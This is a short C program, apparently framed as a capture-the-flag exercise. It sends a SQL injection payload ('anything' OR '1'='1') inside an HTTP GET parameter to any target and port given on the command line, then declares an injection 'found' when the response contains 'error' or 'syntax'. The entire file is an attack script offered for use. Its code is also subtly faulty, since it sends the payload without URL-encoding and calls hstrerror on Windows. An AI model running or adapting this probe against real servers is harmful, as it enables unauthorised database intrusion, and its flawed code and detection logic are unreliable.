/*
Usage:
  1) Compile: gcc 80_http.c -o 80_http
  2) Run: ./80_http <target> <port>
  3) Example: ./80_http 127.0.0.1 80
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#ifdef _WIN32
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#endif

int main(int argc, char *argv[]) {
    char input[64];
    strcpy(input, "anything' OR '1'='1");
    
    char query[128];
    sprintf(query, "SELECT * FROM users WHERE name='%s'", input);

    if (argc != 3) {
        printf("Missing arguments. Please see usage at top.\n");
        printf("Vulnerable query (example): %s\n", query);
        return 1;
    }

#ifdef _WIN32
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        printf("WSAStartup failed.\n");
        return 1;
    }
#endif

    char *target = argv[1];
    int port = atoi(argv[2]);
    struct hostent *he = gethostbyname(target);
    if (!he) {
        printf("Host lookup failed: %s\n", hstrerror(h_errno));
        return 1;
    }

    struct sockaddr_in server;
    int sockfd;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        printf("Socket creation error: %s\n", strerror(errno));
        return 1;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    memcpy(&server.sin_addr, he->h_addr, he->h_length);

    if (connect(sockfd, (struct sockaddr*)&server, sizeof(server)) < 0) {
        printf("Connection error: %s\n", strerror(errno));
#ifdef _WIN32
        closesocket(sockfd);
        WSACleanup();
#else
        close(sockfd);
#endif
        return 1;
    }

    char request[512];
    sprintf(request, "GET /test?user=%s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", input, target);
    if (send(sockfd, request, strlen(request), 0) < 0) {
        printf("Send error: %s\n", strerror(errno));
#ifdef _WIN32
        closesocket(sockfd);
        WSACleanup();
#else
        close(sockfd);
#endif
        return 1;
    }

    char response[2048];
    memset(response, 0, sizeof(response));
    int bytes = recv(sockfd, response, sizeof(response) - 1, 0);
    if (bytes < 0) {
        printf("Receive error: %s\n", strerror(errno));
    } else {
        printf("Vulnerable query (attempted): %s\n", query);
        printf("HTTP response:\n%s\n", response);
        if (strstr(response, "error") || strstr(response, "syntax")) {
            printf("Explanation: The server responded with an error, potential SQL injection discovered.\n");
            printf("Capture the Flag: CTF{SQL_INJECTION_FOUND}\n");
        } else {
            printf("Explanation: No direct error detected. Further testing needed.\n");
        }
    }

#ifdef _WIN32
    closesocket(sockfd);
    WSACleanup();
#else
    close(sockfd);
#endif

    return 0;
}